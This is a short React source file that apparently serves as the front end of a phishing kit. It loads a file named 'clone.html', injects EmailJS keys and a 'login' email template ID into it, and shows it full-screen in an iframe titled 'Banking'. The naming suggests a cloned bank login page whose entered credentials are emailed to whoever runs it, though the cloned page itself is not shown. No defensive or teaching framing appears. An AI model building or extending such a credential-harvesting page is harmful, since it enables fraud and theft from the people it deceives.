import { useEffect, useState } from 'react';

function App() {
  const [page, setPage] = useState('');

  useEffect(() => {
    const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const loginTemplateId = import.meta.env.VITE_EMAILJS_LOGIN_TEMPLATE_ID;

    if (!publicKey || !serviceId || !loginTemplateId) {
      console.error('EmailJS environment variables are not configured. Check VITE_EMAILJS_PUBLIC_KEY, VITE_EMAILJS_SERVICE_ID, and VITE_EMAILJS_LOGIN_TEMPLATE_ID.');
    }

    fetch('/clone.html')
      .then((response) => response.text())
      .then((html) => {
        // Inject EmailJS credentials from Vite environment variables at runtime
        const processedHtml = html
          .replace(/%VITE_EMAILJS_PUBLIC_KEY%/g, publicKey || '')
          .replace(/%VITE_EMAILJS_SERVICE_ID%/g, serviceId || '')
          .replace(/%VITE_EMAILJS_LOGIN_TEMPLATE_ID%/g, loginTemplateId || '');
        setPage(processedHtml);
      });
  }, []);

  return (
    <main className="page-shell">
      {page ? (
        <iframe
          className="cloned-page"
          title="Banking"
          srcDoc={page}
        />
      ) : (
        <div className="loading">Loading…</div>
      )}
    </main>
  );
}

export default App;
